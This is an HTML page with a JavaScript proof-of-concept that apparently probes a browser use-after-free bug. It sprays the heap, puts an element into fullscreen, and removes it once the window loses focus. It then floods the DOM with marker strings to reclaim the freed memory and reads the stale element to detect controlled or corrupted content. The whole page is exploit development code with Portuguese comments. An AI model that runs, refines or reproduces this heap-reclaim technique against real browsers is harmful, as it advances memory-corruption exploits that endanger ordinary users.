<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Aggressive Reclaim (Critical Window Flood)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<button onclick="runTest()">Run Test</button>

<script>

let logBuffer = [];

function log(m){
    try{console.log(m);}catch(e){}
    logBuffer.push(m);
}

// ==========================
function setupHeap(){
    let a=[];
    for(let i=0;i<5000;i++){
        let x=new Float64Array(8);
        a.push(x);
    }
}

// ==========================
function setupFS(){
    let fs=document.createElement("div");

    fs.innerHTML="<h1>FULLSCREEN</h1>";

    fs.style.cssText="position:absolute;width:100%;height:100%;background:black";

    document.body.appendChild(fs);

    fs.webkitRequestFullscreen?.();

    return fs;
}

// ==========================
// 💣 RECLAIM (LOOP CONTÍNUO)
// ==========================
function reclaimBurst(durationMs){

    let start = Date.now();

    function loop(){

        if(Date.now() - start > durationMs) return;

        for(let i=0;i<2000;i++){

            let e=document.createElement("div");
            e.innerHTML="CTRL_"+i+"_4141";
            document.body.appendChild(e);

            let t=document.createTextNode("TXT_"+i);
            document.body.appendChild(t);
        }

        // 🔥 roda novamente IMEDIATO
        setTimeout(loop, 0);
    }

    loop();
}

// ==========================
// PROBE
// ==========================
function probe(fs){

    log("---- PROBE ----");

    try{
        let v = fs.innerHTML;

        log("[LEN] "+(v ? v.length : "null"));
        log("[VAL] "+v);

        if(v){

            if(v.includes("4141"))
                log("[!!!] CONTROLLED HIT");

            if(v.length <= 2)
                log("[!!!] STRING CORROMPIDA");

        }

    }catch(e){
        log("[CRASH]");
    }
}

// ==========================
function trigger(fs){

    log("[*] Trigger");

    try{
        fs.remove();
        document.webkitExitFullscreen?.();
    }catch(e){}

    // 💣 janela crítica REAL
    reclaimBurst(300); // 🔥 300ms flood

    setTimeout(()=>probe(fs),150);
    setTimeout(()=>probe(fs),250);
    setTimeout(()=>probe(fs),350);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),600);
}

// ==========================
function runTest(){

    log("[*] Start");

    setupHeap();

    let fs = setupFS();

    window.onblur = ()=>{
        log("[*] onblur");
        setTimeout(()=>trigger(fs),3000);
    };
}

</script>

</body>
</html>
